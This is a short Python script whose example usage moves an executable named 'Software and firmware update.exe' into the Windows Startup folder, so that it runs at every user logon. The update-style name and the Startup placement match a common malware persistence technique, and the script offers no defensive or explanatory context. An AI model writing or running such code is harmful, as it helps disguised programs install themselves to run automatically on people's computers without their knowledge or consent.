import shutil
import os

def move_exe_file(source_path, destination_directory):
    if not os.path.exists(source_path):
        print(f"The file {source_path} does not exist.")
        return

    if not os.path.exists(destination_directory):
        os.makedirs(destination_directory)

    file_name = os.path.basename(source_path)
    destination_path = os.path.join(destination_directory, file_name)

    shutil.move(source_path, destination_path)
    print(f"Moved {source_path} to {destination_path}")

# Example usage
source_path = '\Software and firmware update.exe'
destination_directory = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
move_exe_file(source_path, destination_directory)